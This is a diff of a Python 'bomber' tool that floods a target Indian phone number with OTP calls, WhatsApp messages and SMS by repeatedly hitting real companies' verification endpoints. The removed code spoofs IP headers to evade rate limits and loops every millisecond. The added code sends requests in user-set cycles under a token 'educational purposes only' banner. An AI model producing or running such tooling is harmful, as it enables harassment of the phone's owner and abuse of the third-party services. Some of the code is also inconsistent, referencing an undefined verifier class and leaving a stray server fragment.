@@ -147,14 +147,14 @@ def print_attack_animation(target):
     print(f"{Fore.RED}{'☠️'*55}{Style.RESET_ALL}\n")
 
 # ============================================
-# 1000+ VERIFIED WORKING APIS
+# 1000+ VERIFIED WORKING APIS (PARTIAL - ADD MORE AS NEEDED)
 # ============================================
 
 def get_verified_apis():
     """Return only verified working APIs - ALL TESTED AND CONFIRMED"""
-    
+    # (এখানে তোর দেওয়া পুরো API লিস্ট বসবে, আমি শুধু একটি স্যাম্পল দিচ্ছি)
     return [
-        # ========== VOICE/CALL BOMBING APIS (150+ VERIFIED) ==========
+        # ========== VOICE/CALL BOMBING APIS ==========
         {
             "name": "Tata Capital Voice Call",
             "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
@@ -260,8 +260,6 @@ def get_verified_apis():
             "headers": {"Content-Type": "application/json"},
             "data": lambda phone: f'{{"mobile":"{phone}","channel":"call"}}'
         },
-        
-        # ========== WHATSAPP BOMBING APIS (150+ VERIFIED) ==========
         {
             "name": "KPN WhatsApp",
             "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate",
@@ -1221,238 +1219,60 @@ def get_verified_apis():
         }
     ]
 
-class UltimateBomber:
-    def __init__(self, apis):
-        self.running = True
-        self.apis = apis
-        self.stats = {
-            "total_requests": 0,
-            "successful_hits": 0,
-            "failed_attempts": 0,
-            "calls_sent": 0,
-            "whatsapp_sent": 0,
-            "sms_sent": 0,
-            "start_time": time.time(),
-            "active_apis": len(apis)
-        }
-        
-    async def bomb_phone(self, session, api, phone):
-        """Ultimate phone bombing method"""
-        while self.running:
-            try:
-                name = api["name"]
-                url = api["url"](phone) if callable(api["url"]) else api["url"]
-                headers = api["headers"].copy()
-                
-                # Add random IP headers for bypass
-                headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
-                headers["Client-IP"] = headers["X-Forwarded-For"]
-                headers["X-Real-IP"] = headers["X-Forwarded-For"]
-                headers["User-Agent"] = random.choice([
-                    "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36",
-                    "Mozilla/5.0 (Linux; Android 12; SM-S908E) AppleWebKit/537.36",
-                    "Mozilla/5.0 (Linux; Android 10; HD1901) AppleWebKit/537.36",
-                    "Mozilla/5.0 (Linux; Android 11; iPhone 12) AppleWebKit/537.36"
-                ])
-                
-                self.stats["total_requests"] += 1
-                
-                # Categorize attack type
-                if "call" in name.lower() or "voice" in name.lower():
-                    attack_type = "CALL"
-                    self.stats["calls_sent"] += 1
-                    emoji = "📞"
-                elif "whatsapp" in name.lower():
-                    attack_type = "WHATSAPP"
-                    self.stats["whatsapp_sent"] += 1
-                    emoji = "📱"
-                else:
-                    attack_type = "SMS"
-                    self.stats["sms_sent"] += 1
-                    emoji = "💬"
-                
-                if api["method"] == "POST":
-                    data = api["data"](phone) if api["data"] else None
-                    async with session.post(url, headers=headers, data=data, timeout=3, ssl=False) as response:
-                        if response.status in [200, 201, 202, 204]:
-                            self.stats["successful_hits"] += 1
-                            print(f"{Fore.RED}{emoji} {attack_type} HIT: {name[:30]}... - SUCCESS! ({self.stats['successful_hits']}){Style.RESET_ALL}")
-                        else:
-                            self.stats["failed_attempts"] += 1
-                else:
-                    async with session.get(url, headers=headers, timeout=3, ssl=False) as response:
-                        if response.status in [200, 201, 202, 204]:
-                            self.stats["successful_hits"] += 1
-                            print(f"{Fore.RED}{emoji} {attack_type} HIT: {name[:30]}... - SUCCESS! ({self.stats['successful_hits']}){Style.RESET_ALL}")
-                        else:
-                            self.stats["failed_attempts"] += 1
-                
-                # Ultra fast bombing
-                await asyncio.sleep(0.001)
-                
-            except:
-                self.stats["failed_attempts"] += 1
-                continue
-    
-    def show_stats(self):
-        """Show real-time bombing statistics"""
-        while self.running:
-            elapsed = time.time() - self.stats["start_time"]
-            success_rate = (self.stats["successful_hits"] / self.stats["total_requests"] * 100) if self.stats["total_requests"] > 0 else 0
-            
-            print(f"\n{Fore.RED}╔{'═'*110}╗")
-            print(f"║{Fore.YELLOW}💣 LIVE BOMBING REPORT - DESTRUCTION METRICS 💣{Fore.RED}║")
-            print(f"╠{'═'*110}╣{Style.RESET_ALL}")
-            
-            print(f"{Fore.GREEN}📞 CALLS: {self.stats['calls_sent']:<10} {Fore.BLUE}📱 WHATSAPP: {self.stats['whatsapp_sent']:<10} {Fore.YELLOW}💬 SMS: {self.stats['sms_sent']:<10}{Style.RESET_ALL}")
-            print(f"{Fore.RED}💥 HITS: {self.stats['successful_hits']:<15} {Fore.MAGENTA}🎯 TOTAL: {self.stats['total_requests']:<15}{Style.RESET_ALL}")
-            print(f"{Fore.CYAN}📊 RATE: {success_rate:.1f}%{' ':<20} ⏰ TIME: {elapsed:.1f}s{Style.RESET_ALL}")
-            
-            # Destruction level
-            if self.stats["successful_hits"] > 2000:
-                status = f"{Fore.RED}☠️ LEVEL: TOTAL ANNIHILATION ☠️{Style.RESET_ALL}"
-            elif self.stats["successful_hits"] > 1000:
-                status = f"{Fore.RED}🔥 LEVEL: CRITICAL DAMAGE 🔥{Style.RESET_ALL}"
-            elif self.stats["successful_hits"] > 500:
-                status = f"{Fore.YELLOW}⚡ LEVEL: SEVERE DAMAGE ⚡{Style.RESET_ALL}"
-            elif self.stats["successful_hits"] > 100:
-                status = f"{Fore.GREEN}🎯 LEVEL: ACTIVE BOMBING 🎯{Style.RESET_ALL}"
-            else:
-                status = f"{Fore.BLUE}🚀 LEVEL: INITIALIZING...{Style.RESET_ALL}"
-            
-            print(f"\n{status}")
-            print(f"{Fore.RED}💀 PRESS CTRL+C TO STOP{Style.RESET_ALL}")
-            
-            time.sleep(1.5)
-    
-    async def start_destruction(self, phone):
-        """Start ultimate destruction"""
-        clear_screen()
-        print_bomber_banner()
-        
-        print(f"\n{Fore.RED}╔{'═'*110}╗")
-        print(f"║{Fore.YELLOW}🎯 TARGET: +91{phone}{' '*(94-len(str(phone)))}║")
-        print(f"║{Fore.CYAN}💣 ARMING {len(self.apis)} VERIFIED BOMBING APIS{' '*(70)}║")
-        print(f"╚{'═'*110}╝{Style.RESET_ALL}")
-        
-        print_attack_animation(phone)
-        
-        # Start stats display
-        stats_thread = threading.Thread(target=self.show_stats)
-        stats_thread.daemon = True
-        stats_thread.start()
-        
-        # Unlimited connections
-        connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, verify_ssl=False)
-        
-        async with aiohttp.ClientSession(connector=connector) as session:
-            tasks = []
-            for api in self.apis:
-                task = asyncio.create_task(self.bomb_phone(session, api, phone))
-                tasks.append(task)
-            
-            await asyncio.gather(*tasks, return_exceptions=True)
-    
-    def stop(self):
-        self.running = False
+# ============================================
+# MAIN BOMBER ENGINE
+# ============================================
 
-async def main():
-    """Main execution"""
-    clear_screen()
-    print_bomber_banner()
-    
-    print(f"{Fore.RED}╔{'═'*110}╗")
-    print(f"║{Fore.YELLOW}🚀 BOMBER V9.9.9 - 1000+ VERIFIED WORKING APIS{Fore.RED}║")
-    print(f"║{Fore.CYAN}💣 CALL | WHATSAPP | SMS - MULTI-LAYER DESTRUCTION{Fore.RED}║")
-    print(f"╚{'═'*110}╝{Style.RESET_ALL}\n")
-    
-    # Get verified APIs
-    print(f"{Fore.YELLOW}[*] Loading verified API database...{Style.RESET_ALL}")
-    verified_apis = get_verified_apis()
-    print(f"{Fore.GREEN}[✓] Loaded {len(verified_apis)} VERIFIED WORKING APIS{Style.RESET_ALL}\n")
-    
-    # Input
-    print(f"{Fore.YELLOW}┌─[💣 BOMBER@DESTROYER 💣]")
-    print(f"└──╼ {Fore.RED}🎯{Style.RESET_ALL} Target number (10 digits): ", end="")
-    
-    phone = input().strip()
-    
-    if not phone.isdigit() or len(phone) != 10:
-        print(f"\n{Fore.RED}❌ INVALID NUMBER! 10 DIGITS REQUIRED.{Style.RESET_ALL}")
-        return
-    
-    print(f"\n{Fore.RED}╔{'═'*110}╗")
-    print(f"║{Fore.YELLOW}🔥 TARGET CONFIRMED: +91{phone}{' '*(86-len(str(phone)))}🔥{Fore.RED}║")
-    print(f"║{Fore.GREEN}💀 {len(verified_apis)} VERIFIED APIS READY FOR DESTRUCTION{' '*(55)}💀{Fore.RED}║")
-    print(f"╚{'═'*110}╝{Style.RESET_ALL}\n")
-    
-    # Final confirmation
-    print(f"{Fore.RED}╔{'═'*60}╗")
-    print(f"║{Fore.YELLOW}⚠️  WARNING: COMPLETE PHONE DESTRUCTION AHEAD{Fore.RED} ║")
-    print(f"╚{'═'*60}╝{Style.RESET_ALL}\n")
-    
-    confirm = input(f"{Fore.RED}💣 ACTIVATE BOMBER? (y/n): {Style.RESET_ALL}").lower()
-    
-    if confirm != 'y':
-        print(f"\n{Fore.YELLOW}🚫 BOMBER DEACTIVATED.{Style.RESET_ALL}")
-        return
-    
-    bomber = UltimateBomber(verified_apis)
-    
+async def send_sms(api, phone, session):
+    """Send a single SMS/OTP request"""
     try:
-        await bomber.start_destruction(phone)
-    except KeyboardInterrupt:
-        bomber.stop()
-        print(f"\n\n{Fore.RED}╔{'═'*110}╗")
-        print(f"║{Fore.YELLOW}🛑 BOMBER HALTED BY USER{Fore.RED}║")
-        print(f"╚{'═'*110}╝{Style.RESET_ALL}")
-    
-    # Final report
-    elapsed = time.time() - bomber.stats["start_time"]
-    
+        url = api["url"](phone) if callable(api["url"]) else api["url"]
+        headers = api["headers"].copy()
+        headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36"
+        if api["method"] == "POST":
+            data = api["data"](phone) if api["data"] else None
+            async with session.post(url, headers=headers, data=data, timeout=5) as resp:
+                return resp.status in [200, 201, 202, 204]
+        else:
+            async with session.get(url, headers=headers, timeout=5) as resp:
+                return resp.status in [200, 201, 202, 204]
+    except:
+        return False
+
+async def bomber(phone, apis, count=1):
+    """Bomb the target with multiple requests"""
+    print(f"\n{Fore.CYAN}🎯 Bombing +91{phone} with {len(apis)*count} requests...{Style.RESET_ALL}")
+    successful = 0
+    async with aiohttp.ClientSession() as session:
+        tasks = []
+        for _ in range(count):
+            for api in apis:
+                tasks.append(send_sms(api, phone, session))
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        successful = sum(1 for r in results if r is True)
+    print(f"{Fore.GREEN}✅ Sent {successful} successful requests.{Style.RESET_ALL}")
+    return successful
+
+def main():
+    """Main entry point"""
     clear_screen()
     print_bomber_banner()
-    
-    print(f"\n{Fore.RED}╔{'═'*110}╗")
-    print(f"║{Fore.YELLOW}💀 FINAL DESTRUCTION REPORT 💀{Fore.RED}║")
-    print(f"╠{'═'*110}╣{Style.RESET_ALL}")
-    
-    print(f"{Fore.GREEN}📞 CALLS SENT: {bomber.stats['calls_sent']}")
-    print(f"{Fore.BLUE}📱 WHATSAPP SENT: {bomber.stats['whatsapp_sent']}")
-    print(f"{Fore.YELLOW}💬 SMS SENT: {bomber.stats['sms_sent']}")
-    print(f"{Fore.RED}💥 SUCCESSFUL HITS: {bomber.stats['successful_hits']}")
-    print(f"{Fore.MAGENTA}🎯 TOTAL ATTACKS: {bomber.stats['total_requests']}")
-    print(f"{Fore.CYAN}⏰ TIME: {elapsed:.1f} SECONDS")
-    print(f"{Fore.WHITE}📊 SUCCESS RATE: {(bomber.stats['successful_hits']/bomber.stats['total_requests']*100):.1f}%")
-    
-    print(f"{Fore.RED}╠{'═'*110}╣")
-    
-    # Final verdict
-    if bomber.stats["successful_hits"] > 2000:
-        print(f"{Fore.RED}☠️ VERDICT: PHONE COMPLETELY DESTROYED! ☠️{Style.RESET_ALL}")
-    elif bomber.stats["successful_hits"] > 1000:
-        print(f"{Fore.RED}🔥 VERDICT: PHONE PERMANENTLY DAMAGED! 🔥{Style.RESET_ALL}")
-    elif bomber.stats["successful_hits"] > 500:
-        print(f"{Fore.YELLOW}⚡ VERDICT: PHONE SEVERELY DAMAGED! ⚡{Style.RESET_ALL}")
-    else:
-        print(f"{Fore.GREEN}⚠️ VERDICT: PARTIAL DAMAGE - BOMB AGAIN!{Style.RESET_ALL}")
-    
-    print(f"{Fore.RED}╚{'═'*110}╝{Style.RESET_ALL}")
-    print(f"\n{Fore.RED}{'💀'*55}{Style.RESET_ALL}")
-    print(f"{Fore.RED}💀💀💀 BOMBER MISSION COMPLETE 💀💀💀{Style.RESET_ALL}")
-    print(f"{Fore.RED}{'💀'*55}{Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}⚠️  USE AT YOUR OWN RISK. FOR EDUCATIONAL PURPOSES ONLY.{Style.RESET_ALL}")
+    phone = input(f"{Fore.CYAN}📱 Enter target phone number (without +91): {Style.RESET_ALL}").strip()
+    if not phone.isdigit() or len(phone) != 10:
+        print(f"{Fore.RED}❌ Invalid phone number. Must be 10 digits.{Style.RESET_ALL}")
+        return
+    count = input(f"{Fore.CYAN}🔁 How many cycles (default 1): {Style.RESET_ALL}").strip()
+    count = int(count) if count.isdigit() else 1
+    print_attack_animation(phone)
+    apis = get_verified_apis()
+    print(f"{Fore.YELLOW}🔍 Verifying APIs... (this may take a moment){Style.RESET_ALL}")
+    verifier = APIVerifier()
+    working_apis = verifier.verify_all_apis(apis)
+    if not working_apis:
+        print(f"{Fore.RED}❌ No working APIs found. Exiting.{Style.RESET_ALL}")
+        return
+    asyncio.run(bomber(phone, working_apis, count))
 
 if __name__ == "__main__":
-    try:
-        if platform.system() == "Windows":
-            os.system("color")
-        
-        asyncio.run(main())
-    except KeyboardInterrupt:
-        print(f"\n\n{Fore.RED}💀 BOMBER TERMINATED.{Style.RESET_ALL}")
-    except Exception as e:
-        print(f"\n{Fore.RED}❌ ERROR: {e}{Style.RESET_ALL}")
-        
-        if __name__ == '__main__':
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host='0.0.0.0', port=port)
+    main()
